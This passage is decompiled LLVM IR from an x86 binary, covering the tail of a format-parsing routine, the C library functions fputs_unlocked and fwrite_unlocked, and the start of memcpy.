  %v0_80526ed = load i32, i32* %edi.global-to-local, align 4
  %v1_80526f7 = and i32 %v0_80526ed, -5
  %v0_80526fd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526fd = and i32 %v0_80526fd, 3840
  store i32 %v1_80526fd, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8052706 = or i32 %v1_80526fd, %v1_80526f7
  store i32 %v2_8052706, i32* @edi, align 4
  %v1_8052708 = load i32, i32* @edx, align 4
  %v2_8052708 = add i32 %v1_8052708, 20
  %v3_8052708 = inttoptr i32 %v2_8052708 to i32*
  store i32 48, i32* %v3_8052708, align 4
  %v0_805270b = load i32, i32* @edi, align 4
  %v1_805270b = load i32, i32* @edx, align 4
  %v2_805270b = add i32 %v1_805270b, 16
  %v3_805270b = inttoptr i32 %v2_805270b to i32*
  store i32 %v0_805270b, i32* %v3_805270b, align 4
  %v0_805270e = load i32, i32* @ecx, align 4
  %v1_805270e = inttoptr i32 %v0_805270e to i8*
  %v2_805270e = load i8, i8* %v1_805270e, align 1
  %v3_805270e = icmp eq i8 %v2_805270e, 0
  %v1_8052711 = icmp eq i1 %v3_805270e, false
  br i1 %v1_8052711, label %dec_label_pc_805272a, label %dec_label_pc_8052713

dec_label_pc_8052713:                             ; preds = %dec_label_pc_80526ce
  %v0_8052713 = load i32, i32* @esi, align 4
  %v1_8052713 = inttoptr i32 %v0_8052713 to i8*
  %v2_8052713 = load i8, i8* %v1_8052713, align 1
  %v11_8052713 = icmp eq i8 %v2_8052713, 109
  %v1_8052716 = icmp eq i1 %v11_8052713, false
  br i1 %v1_8052716, label %dec_label_pc_805281c, label %dec_label_pc_805271c

dec_label_pc_805271c:                             ; preds = %dec_label_pc_8052713
  %v0_805271c = load i32, i32* @edx, align 4
  %v1_805271c = add i32 %v0_805271c, 32
  %v2_805271c = inttoptr i32 %v1_805271c to i32*
  store i32 20, i32* %v2_805271c, align 4
  %v0_8052723 = load i32, i32* @edx, align 4
  %v1_8052723 = add i32 %v0_8052723, 28
  %v2_8052723 = inttoptr i32 %v1_8052723 to i32*
  store i32 0, i32* %v2_8052723, align 4
  br label %dec_label_pc_805272a

dec_label_pc_805272a:                             ; preds = %dec_label_pc_80526ce, %dec_label_pc_805271c
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_80527be, label %dec_label_pc_8052735

dec_label_pc_8052735:                             ; preds = %dec_label_pc_805272a
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_8052776 = add i32 %tmp76, 40
  %v1_80527af = add i32 %tmp76, 28
  %v2_80527af = inttoptr i32 %v1_80527af to i32*
  %v4_8052744 = add i32 %tmp76, 36
  br label %dec_label_pc_8052737

dec_label_pc_8052737:                             ; preds = %dec_label_pc_80527aa, %dec_label_pc_8052735
  %v0_805274d = phi i32 [ 0, %dec_label_pc_8052735 ], [ %v1_80527ae, %dec_label_pc_80527aa ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8052735 ], [ %stack_var_-88.5, %dec_label_pc_80527aa ]
  %v1_8052737 = add i32 %v0_805274d, -2
  %v6_8052737 = sub i32 1, %v0_805274d
  %v7_8052737 = and i32 %v6_8052737, %v0_805274d
  %v8_8052737 = icmp slt i32 %v7_8052737, 0
  %v9_8052737 = icmp eq i32 %v1_8052737, 0
  %v10_8052737 = icmp slt i32 %v1_8052737, 0
  %v3_805273a = icmp eq i1 %v10_8052737, %v8_8052737
  %v4_805273a = icmp eq i1 %v9_8052737, false
  %v5_805273a = and i1 %v4_805273a, %v3_805273a
  br i1 %v5_805273a, label %dec_label_pc_805274d, label %dec_label_pc_805273c

dec_label_pc_805273c:                             ; preds = %dec_label_pc_8052737
  store i32 %tmp76, i32* @edx, align 4
  %v0_8052740 = load i32, i32* @esp, align 4
  %v2_8052740 = mul i32 %v0_805274d, 4
  %v3_8052740 = add i32 %v2_8052740, 68
  %v4_8052740 = add i32 %v3_8052740, %v0_8052740
  %v5_8052740 = inttoptr i32 %v4_8052740 to i32*
  %v6_8052740 = load i32, i32* %v5_8052740, align 4
  store i32 %v6_8052740, i32* %eax.global-to-local, align 4
  %v1_8052744 = trunc i32 %v6_8052740 to i8
  %v5_8052744 = add i32 %v4_8052744, %v0_805274d
  %v6_8052744 = inttoptr i32 %v5_8052744 to i8*
  store i8 %v1_8052744, i8* %v6_8052744, align 1
  %v0_8052748 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052748 = urem i32 %v0_8052748, 256
  br label %dec_label_pc_8052756

dec_label_pc_805274d:                             ; preds = %dec_label_pc_8052737
  %v5_805274f = add i32 %v0_805274d, %stack_var_-32.3
  store i32 %v5_805274f, i32* %eax.global-to-local, align 4
  %v1_8052753 = add i32 %v5_805274f, -2
  br label %dec_label_pc_8052756

dec_label_pc_8052756:                             ; preds = %dec_label_pc_805273c, %dec_label_pc_805274d
  %v0_8052769 = phi i32 [ %v1_8052748, %dec_label_pc_805273c ], [ %v1_8052753, %dec_label_pc_805274d ]
  store i32 %v0_8052769, i32* %eax.global-to-local, align 4
  %v5_8052756 = sub i32 %v0_8052769, %stack_var_-88.4
  %v11_8052756 = xor i32 %v0_8052769, %stack_var_-88.4
  %v12_8052756 = xor i32 %v5_8052756, %v0_8052769
  %v13_8052756 = and i32 %v12_8052756, %v11_8052756
  %v14_8052756 = icmp slt i32 %v13_8052756, 0
  %v15_8052756 = icmp eq i32 %v5_8052756, 0
  %v16_8052756 = icmp slt i32 %v5_8052756, 0
  %v3_805275a = icmp ne i1 %v16_8052756, %v14_8052756
  %v4_805275a = or i1 %v15_8052756, %v3_805275a
  br i1 %v4_805275a, label %dec_label_pc_8052769, label %dec_label_pc_805275c

dec_label_pc_805275c:                             ; preds = %dec_label_pc_8052756
  %v1_805275c = add i32 %v0_8052769, -9
  %v6_805275c = sub i32 8, %v0_8052769
  %v7_805275c = and i32 %v6_805275c, %v0_8052769
  %v8_805275c = icmp slt i32 %v7_805275c, 0
  %v9_805275c = icmp eq i32 %v1_805275c, 0
  %v10_805275c = icmp slt i32 %v1_805275c, 0
  %v3_805275f = icmp eq i1 %v10_805275c, %v8_805275c
  %v4_805275f = icmp eq i1 %v9_805275c, false
  %v5_805275f = and i1 %v4_805275f, %v3_805275f
  br i1 %v5_805275f, label %dec_label_pc_805281c, label %dec_label_pc_8052769

dec_label_pc_8052769:                             ; preds = %dec_label_pc_805275c, %dec_label_pc_8052756
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_8052756 ], [ %v0_8052769, %dec_label_pc_805275c ]
  %v1_8052769 = add i32 %v0_8052769, -1
  store i32 %v1_8052769, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_8052772 = load i32, i32* @esp, align 4
  %v1_8052772 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052772 = mul i32 %v1_8052772, 4
  %v3_8052772 = add i32 %v0_8052772, 80
  %v4_8052772 = add i32 %v3_8052772, %v2_8052772
  %v5_8052772 = inttoptr i32 %v4_8052772 to i32*
  %v6_8052772 = load i32, i32* %v5_8052772, align 4
  store i32 %v6_8052772, i32* %edi.global-to-local, align 4
  %v2_8052776 = mul i32 %v1_8052769, 4
  %v4_8052776 = add i32 %v3_8052776, %v2_8052776
  %v5_8052776 = inttoptr i32 %v4_8052776 to i32*
  %v6_8052776 = load i32, i32* %v5_8052776, align 4
  store i32 %v6_8052776, i32* @eax, align 4
  %v9_805277a = icmp eq i32 %v6_8052772, 8
  br i1 %v9_805277a, label %dec_label_pc_80527aa, label %dec_label_pc_805277f

dec_label_pc_805277f:                             ; preds = %dec_label_pc_8052769
  %v9_805277f = icmp eq i32 %v6_8052776, 8
  br i1 %v9_805277f, label %dec_label_pc_805279a, label %dec_label_pc_8052784

dec_label_pc_8052784:                             ; preds = %dec_label_pc_805277f
  %v12_8052784 = icmp eq i32 %v6_8052776, %v6_8052772
  br i1 %v12_8052784, label %dec_label_pc_805279a, label %dec_label_pc_8052788

dec_label_pc_8052788:                             ; preds = %dec_label_pc_8052784
  %v1_8052788 = call i32 @_promoted_size(i32 %v1_8052769)
  store i32 %v1_8052788, i32* %ebx.global-to-local, align 4
  %v0_805278f = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805278f, i32* @eax, align 4
  %v1_8052791 = call i32 @_promoted_size(i32 %v1_8052769)
  store i32 %v1_8052791, i32* %eax.global-to-local, align 4
  %v8_8052798 = icmp sgt i32 %v1_8052788, %v1_8052791
  br i1 %v8_8052798, label %dec_label_pc_80527aa, label %dec_label_pc_8052788.dec_label_pc_805279a_crit_edge

dec_label_pc_8052788.dec_label_pc_805279a_crit_edge: ; preds = %dec_label_pc_8052788
  %v0_80527a2.pre = load i32, i32* @esp, align 4
  %v1_80527a2.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805279a

dec_label_pc_805279a:                             ; preds = %dec_label_pc_8052788.dec_label_pc_805279a_crit_edge, %dec_label_pc_8052784, %dec_label_pc_805277f
  %v1_80527a2 = phi i32 [ %v1_80527a2.pre, %dec_label_pc_8052788.dec_label_pc_805279a_crit_edge ], [ %v1_8052772, %dec_label_pc_8052784 ], [ %v1_8052772, %dec_label_pc_805277f ]
  %v0_80527a2 = phi i32 [ %v0_80527a2.pre, %dec_label_pc_8052788.dec_label_pc_805279a_crit_edge ], [ %v0_8052772, %dec_label_pc_8052784 ], [ %v0_8052772, %dec_label_pc_805277f ]
  store i32 %v1_8052769, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_80527a2 = mul i32 %v1_80527a2, 4
  %v3_80527a2 = add i32 %v0_80527a2, 80
  %v4_80527a2 = add i32 %v3_80527a2, %v2_80527a2
  %v5_80527a2 = inttoptr i32 %v4_80527a2 to i32*
  %v6_80527a2 = load i32, i32* %v5_80527a2, align 4
  store i32 %v6_80527a2, i32* %eax.global-to-local, align 4
  store i32 %v6_80527a2, i32* %v5_8052776, align 4
  br label %dec_label_pc_80527aa

dec_label_pc_80527aa:                             ; preds = %dec_label_pc_8052788, %dec_label_pc_8052769, %dec_label_pc_805279a
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80527ae = load i32, i32* %ebp.global-to-local, align 4
  %v1_80527ae = add i32 %v0_80527ae, 1
  store i32 %v1_80527ae, i32* %ebp.global-to-local, align 4
  %v3_80527af = load i32, i32* %v2_80527af, align 4
  %v1_80527b2 = add i32 %v3_80527af, 2
  store i32 %v1_80527b2, i32* %eax.global-to-local, align 4
  %v5_80527b7 = icmp slt i32 %v1_80527ae, %v1_80527b2
  br i1 %v5_80527b7, label %dec_label_pc_8052737, label %dec_label_pc_80527e5

dec_label_pc_80527be:                             ; preds = %dec_label_pc_805272a
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_80527c2 = add i32 %tmp76, 38
  %v2_80527c2 = inttoptr i32 %v1_80527c2 to i8*
  store i8 1, i8* %v2_80527c2, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80527cb = add i32 %tmp76, 28
  %v2_80527cb = inttoptr i32 %v1_80527cb to i32*
  %v3_80527cb = load i32, i32* %v2_80527cb, align 4
  %v2_80527ce = mul i32 %v3_80527cb, 4
  %v2_80527d2 = ptrtoint i32* %stack_var_-20 to i32
  %v1_80527d9 = add i32 %tmp76, 40
  store i32 %v1_80527d9, i32* %eax.global-to-local, align 4
  %v3_80527dd = inttoptr i32 %v1_80527d9 to i16*
  %v4_80527dd = call i32 @memcpy(i16* %v3_80527dd, i32 %v2_80527d2, i32 %v2_80527ce)
  store i32 %v4_80527dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527e5

dec_label_pc_80527e5:                             ; preds = %dec_label_pc_80527aa, %dec_label_pc_80527be
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_80527be ], [ %stack_var_-88.5, %dec_label_pc_80527aa ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8052490, align 4
  %v0_80527f0 = load i32, i32* @ecx, align 4
  %v1_80527f0 = add i32 %v0_80527f0, 16
  %v2_80527f0 = inttoptr i32 %v1_80527f0 to i8*
  %v3_80527f0 = load i8, i8* %v2_80527f0, align 1
  %v5_80527f0 = icmp slt i8 %v3_80527f0, 0
  br i1 %v5_80527f0, label %dec_label_pc_80527fd, label %dec_label_pc_80527f6

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80527e5
  %v0_80527f6 = load i32, i32* @esi, align 4
  %v1_80527f6 = add i32 %v0_80527f6, 1
  store i32 %v1_80527f6, i32* %eax.global-to-local, align 4
  %v2_80527f9 = inttoptr i32 %v0_80527f0 to i32*
  store i32 %v1_80527f6, i32* %v2_80527f9, align 4
  br label %dec_label_pc_8052810

dec_label_pc_80527fd:                             ; preds = %dec_label_pc_80527e5
  store i32 %v4_8052464, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8052805 = load i32, i32* @esi, align 4
  %v2_8052805 = sub i32 %v0_8052805, %v4_8052464
  store i32 %v2_8052805, i32* %esi.global-to-local, align 4
  %v1_8052807 = mul i32 %v2_8052805, 4
  %v2_8052807 = add i32 %v1_8052807, 224
  store i32 %v2_8052807, i32* %eax.global-to-local, align 4
  %v2_805280e = load i32, i32* %arg1, align 4
  %v4_805280e = add i32 %v2_805280e, %v2_8052807
  store i32 %v4_805280e, i32* %arg1, align 4
  br label %dec_label_pc_8052810

dec_label_pc_8052810:                             ; preds = %dec_label_pc_80527f6, %dec_label_pc_80527fd
  store i32 %tmp76, i32* @edx, align 4
  %v1_8052814 = add i32 %tmp76, 28
  %v2_8052814 = inttoptr i32 %v1_8052814 to i32*
  %v3_8052814 = load i32, i32* %v2_8052814, align 4
  store i32 %v3_8052814, i32* %eax.global-to-local, align 4
  %v1_8052817 = add i32 %v3_8052814, 2
  br label %dec_label_pc_805281f

dec_label_pc_805281c:                             ; preds = %dec_label_pc_80524b5, %dec_label_pc_805254f, %dec_label_pc_8052582, %dec_label_pc_80525fd, %dec_label_pc_80525e9, %dec_label_pc_80525e0, %dec_label_pc_805275c, %dec_label_pc_8052713, %dec_label_pc_805265f
  br label %dec_label_pc_805281f

dec_label_pc_805281f:                             ; preds = %dec_label_pc_8052810, %dec_label_pc_805281c
  %storemerge6 = phi i32 [ %v1_8052817, %dec_label_pc_8052810 ], [ -1, %dec_label_pc_805281c ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_8052822 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052822, i32* @ebx, align 4
  store i32 %v0_8052463, i32* @esi, align 4
  store i32 %v0_8052462, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_80527ae, { 0, 2, 1 }
  uselistorder i32 %v1_8052769, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805275c, { 1, 0 }
  uselistorder i32 %v5_8052756, { 1, 2, 0 }
  uselistorder i32 %v0_8052769, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8052737, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805274d, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_80526c8, { 1, 2, 0 }
  uselistorder i32 %v1_805269e, { 1, 2, 0 }
  uselistorder i32 %v0_80526c8, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052663, { 1, 0 }
  uselistorder i32 %v1_8052652, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805265b, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8052645, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805263b, { 1, 0 }
  uselistorder i32 %v1_805261d, { 1, 0 }
  uselistorder i32 %v0_805263b.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8052600, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80525f7, { 1, 2, 0 }
  uselistorder i32 %v0_80525bd, { 1, 0 }
  uselistorder i32 %v1_80525af, { 1, 0 }
  uselistorder i32 %v1_80525aa, { 0, 1, 3, 2 }
  uselistorder i32 %v6_80525a8, { 2, 0, 1 }
  uselistorder i32 %v0_80525ca, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8052565, { 1, 2, 0 }
  uselistorder i32 %v0_805253d, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8052530.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8052529.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_8052533, { 1, 2, 0 }
  uselistorder i32 %v6_8052531, { 0, 2, 1 }
  uselistorder i32 %v1_8052530, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8052529, { 2, 1, 0 }
  uselistorder i32 %v1_8052521, { 1, 0 }
  uselistorder i32 %v1_8052529137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_8052519, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_805250c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_8052507, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80524dd, { 0, 2, 1 }
  uselistorder i32 %v2_80524cc, { 1, 0 }
  uselistorder i32 %v0_80524ca, { 2, 0, 1 }
  uselistorder i32 %v4_8052464, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 42, 30, 29, 31, 32, 34, 33, 44, 43, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 4, 0, 1, 2, 3 }
  uselistorder i32 -134592011, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_805b615.497 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805281f, { 1, 0 }
  uselistorder label %dec_label_pc_805281c, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_8052810, { 1, 0 }
  uselistorder label %dec_label_pc_80527e5, { 1, 0 }
  uselistorder label %dec_label_pc_80527aa, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052756, { 1, 0 }
  uselistorder label %dec_label_pc_805272a, { 1, 0 }
  uselistorder label %dec_label_pc_8052692, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805265f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052636, { 1, 0 }
  uselistorder label %dec_label_pc_805260d, { 1, 0 }
  uselistorder label %dec_label_pc_80525d4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052577, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052530, { 1, 0 }
  uselistorder label %dec_label_pc_8052521, { 1, 0 }
  uselistorder label %dec_label_pc_8052517, { 1, 0 }
  uselistorder label %dec_label_pc_8052500, { 1, 0 }
  uselistorder label %dec_label_pc_8052500.outer, { 2, 0, 1 }
}

define i32 @__GI_fputs_unlocked() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8052828 = load i32, i32* @esi, align 4
  %v0_8052829 = load i32, i32* @ebx, align 4
  store i32 %v0_8052829, i32* %stack_var_-8, align 4
  %v4_805282d = ptrtoint i8* %tmp4 to i32
  store i32 %v4_805282d, i32* @ebx, align 4
  %v3_8052832 = call i32 @strlen(i8* %tmp4)
  store i32 %v3_8052832, i32* @esi, align 4
  %v0_8052843 = load i32, i32* @ebx, align 4
  %v6_8052844 = call i32 @__GI_fwrite_unlocked(i32 %v0_8052843, i64 1, i32 %v3_8052832, i32 %tmp)
  %v1_805284f = load i32, i32* @esi, align 4
  %v12_805284f = icmp eq i32 %v6_8052844, %v1_805284f
  %v1_8052851 = icmp eq i1 %v12_805284f, false
  br i1 %v1_8052851, label %dec_label_pc_8052855, label %dec_label_pc_8052853

dec_label_pc_8052853:                             ; preds = %entry
  br label %dec_label_pc_8052855

dec_label_pc_8052855:                             ; preds = %entry, %dec_label_pc_8052853
  %v0_8052855 = phi i32 [ -1, %entry ], [ %v6_8052844, %dec_label_pc_8052853 ]
  %v2_8052858 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052858, i32* @ebx, align 4
  store i32 %v0_8052828, i32* @esi, align 4
  ret i32 %v0_8052855

; uselistorder directives
  uselistorder i32 %v6_8052844, { 1, 0 }
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder label %dec_label_pc_8052855, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805285c = load i32, i32* @edi, align 4
  %v0_805285d = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_8052863 = trunc i64 %arg2 to i32
  store i32 %v4_8052863, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805286b = inttoptr i32 %arg4 to i16*
  %v2_805286b = load i16, i16* %v1_805286b, align 2
  %v1_805286e = and i16 %v2_805286b, 192
  %v6_8052873 = icmp eq i16 %v1_805286e, 192
  br i1 %v6_8052873, label %dec_label_pc_805288e, label %dec_label_pc_805287a

dec_label_pc_805287a:                             ; preds = %entry
  %v0_805287a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_8052882 = call i32 @__stdio_trans2w_o(i16* %v1_805286b, i32 128, i32 %v0_805287a, i32 %v0_805287a)
  %v1_805288a = icmp eq i32 %v6_8052882, 0
  %v1_805288c = icmp eq i1 %v1_805288a, false
  br i1 %v1_805288c, label %dec_label_pc_80528ca, label %dec_label_pc_805288e

dec_label_pc_805288e:                             ; preds = %dec_label_pc_805287a, %entry
  %v2_805288e = icmp eq i32 %v4_8052863, 0
  br i1 %v2_805288e, label %dec_label_pc_80528ca, label %dec_label_pc_8052892

dec_label_pc_8052892:                             ; preds = %dec_label_pc_805288e
  %v1_8052892 = icmp eq i32 %arg3, 0
  br i1 %v1_8052892, label %dec_label_pc_80528ca, label %dec_label_pc_8052896

dec_label_pc_8052896:                             ; preds = %dec_label_pc_8052892
  %v9_805289b = udiv i64 4294967295, %arg2
  %v10_805289b = trunc i64 %v9_805289b to i32
  %v6_805289f = icmp ult i32 %v10_805289b, %arg3
  br i1 %v6_805289f, label %dec_label_pc_80528bb, label %dec_label_pc_80528a1

dec_label_pc_80528a1:                             ; preds = %dec_label_pc_8052896
  %sext = mul i64 %arg2, 4294967296
  %v2_80528a4 = sdiv i64 %sext, 4294967296
  %v3_80528a4 = sext i32 %arg3 to i64
  %v4_80528a4 = mul nsw i64 %v3_80528a4, %v2_80528a4
  %v5_80528a4 = trunc i64 %v4_80528a4 to i32
  %v0_80528a7 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_80528ad = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_80528a4, i32 %v0_80528a7, i32 %v10_805289b)
  %v6_80528ad = sext i32 %v5_80528ad to i64
  %v10_80528b4 = udiv i64 %v6_80528ad, %arg2
  %v11_80528b4 = trunc i64 %v10_80528b4 to i32
  br label %dec_label_pc_80528cc

dec_label_pc_80528bb:                             ; preds = %dec_label_pc_8052896
  %v0_80528bb = load i32, i32* @ebx, align 4
  %v1_80528bb = inttoptr i32 %v0_80528bb to i16*
  %v2_80528bb = load i16, i16* %v1_80528bb, align 2
  %v3_80528bb = or i16 %v2_80528bb, 8
  store i16 %v3_80528bb, i16* %v1_80528bb, align 2
  %v0_80528bf = load i32, i32* %stack_var_-28, align 4
  %v1_80528bf = call i32 @__errno_location(i32 %v0_80528bf)
  %v1_80528c4 = inttoptr i32 %v1_80528bf to i32*
  store i32 22, i32* %v1_80528c4, align 4
  br label %dec_label_pc_80528ca

dec_label_pc_80528ca:                             ; preds = %dec_label_pc_8052892, %dec_label_pc_805288e, %dec_label_pc_805287a, %dec_label_pc_80528bb
  br label %dec_label_pc_80528cc

dec_label_pc_80528cc:                             ; preds = %dec_label_pc_80528a1, %dec_label_pc_80528ca
  %v0_80528cf = phi i32 [ %v11_80528b4, %dec_label_pc_80528a1 ], [ 0, %dec_label_pc_80528ca ]
  store i32 %v0_805285d, i32* @esi, align 4
  store i32 %v0_805285c, i32* @edi, align 4
  ret i32 %v0_80528cf

; uselistorder directives
  uselistorder i32 %v0_805287a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80528cc, { 1, 0 }
  uselistorder label %dec_label_pc_80528ca, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80528d1 = load i32, i32* @esi, align 4
  store i32 %v0_80528d1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_80528d2 = sdiv i32 %sext, 16777216
  store i32 %v4_80528d2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80528dc = ptrtoint i16* %arg1 to i32
  store i32 %v4_80528dc, i32* %edi.global-to-local, align 4
  %v2_80528e0 = udiv i32 %v4_80528d2, 4
  %v3_80528e3 = inttoptr i32 %arg2 to i8*
  %v4_80528e3 = bitcast i16* %arg1 to i8*
  %v5_80528e3 = call i8* @_memcpy(i8* %v4_80528e3, i8* %v3_80528e3, i32 %v2_80528e0)
  %v6_80528e3 = ptrtoint i8* %v5_80528e3 to i32
  store i32 %v6_80528e3, i32* @ecx, align 4
  %v0_80528e5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528e5 = and i32 %v0_80528e5, 2
  %v3_80528e5 = icmp eq i32 %v2_80528e5, 0
  br i1 %v3_80528e5, label %dec_label_pc_80528eb, label %dec_label_pc_80528e9

dec_label_pc_80528e9:                             ; preds = %entry
  %v0_80528e9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80528e9 = inttoptr i32 %v0_80528e9 to i16*
  %v2_80528e9 = load i16, i16* %v1_80528e9, align 2
  %v3_80528e9 = load i32, i32* %edi.global-to-local, align 4
  %v4_80528e9 = inttoptr i32 %v3_80528e9 to i16*
  store i16 %v2_80528e9, i16* %v4_80528e9, align 2
  %v5_80528e9 = load i32, i32* %edi.global-to-local, align 4
  %v6_80528e9 = load i32, i32* %esi.global-to-local, align 4
  %v7_80528e9 = load i1, i1* @df, align 1
  %v8_80528e9 = select i1 %v7_80528e9, i32 -2, i32 2
  %v9_80528e9 = add i32 %v8_80528e9, %v5_80528e9
  %v10_80528e9 = add i32 %v8_80528e9, %v6_80528e9
  store i32 %v9_80528e9, i32* %edi.global-to-local, align 4
  store i32 %v10_80528e9, i32* %esi.global-to-local, align 4
  %v0_80528eb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528eb

dec_label_pc_80528eb:                             ; preds = %entry, %dec_label_pc_80528e9
  %v0_80528eb = phi i32 [ %v0_80528e5, %entry ], [ %v0_80528eb.pre, %dec_label_pc_80528e9 ]
  %v2_80528eb = urem i32 %v0_80528eb, 2
  %v3_80528eb = icmp eq i32 %v2_80528eb, 0
  br i1 %v3_80528eb, label %dec_label_pc_80528f0, label %dec_label_pc_80528ef

dec_label_pc_80528ef:                             ; preds = %dec_label_pc_80528eb
  %v0_80528ef = load i32, i32* %esi.global-to-local, align 4
  %v1_80528ef = inttoptr i32 %v0_80528ef to i8*
  %v2_80528ef = load i8, i8* %v1_80528ef, align 1
  %v3_80528ef = load i32, i32* %edi.global-to-local, align 4
  %v4_80528ef = inttoptr i32 %v3_80528ef to i8*
  store i8 %v2_80528ef, i8* %v4_80528ef, align 1
  %v5_80528ef = load i32, i32* %edi.global-to-local, align 4
  %v6_80528ef = load i32, i32* %esi.global-to-local, align 4
  %v7_80528ef = load i1, i1* @df, align 1
  %v8_80528ef = select i1 %v7_80528ef, i32 -1, i32 1
